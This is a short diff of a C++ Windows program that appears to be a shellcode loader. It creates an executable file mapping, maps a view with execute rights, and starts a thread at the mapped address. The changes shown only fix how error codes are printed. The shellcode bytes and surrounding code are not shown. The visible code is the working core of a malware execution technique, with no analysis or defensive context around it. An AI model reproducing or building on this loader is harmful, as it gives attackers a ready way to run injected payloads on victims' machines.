@@ -31,14 +31,14 @@ int main() {
 	HANDLE hfile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sizeof(shellcode),NULL);
 
 	if (hfile == NULL) {
-		cout << "[!] CreateFileMappingW Failed With Error: " + GetLastError() << endl;
+		cout << "[!] CreateFileMappingW Failed With Error: " << GetLastError() << endl;
 		return EXIT_FAILURE;
 	}
 
 	LPVOID address = MapViewOfFile(hfile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sizeof(shellcode));
 
 	if (address == NULL) {
-		cout << "[!] MapViewOfFile Failed With Error: " + GetLastError() << endl;
+		cout << "[!] MapViewOfFile Failed With Error: " << GetLastError() << endl;
 		return EXIT_FAILURE;
 	}
 
@@ -49,7 +49,7 @@ int main() {
 	HANDLE hthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, NULL);
 
 	if (hthread == NULL) {
-		cout << "[!] CreateThread Failed With Error: " + GetLastError() << endl;
+		cout << "[!] CreateThread Failed With Error: " << GetLastError() << endl;
 		return EXIT_FAILURE;
 	}
 
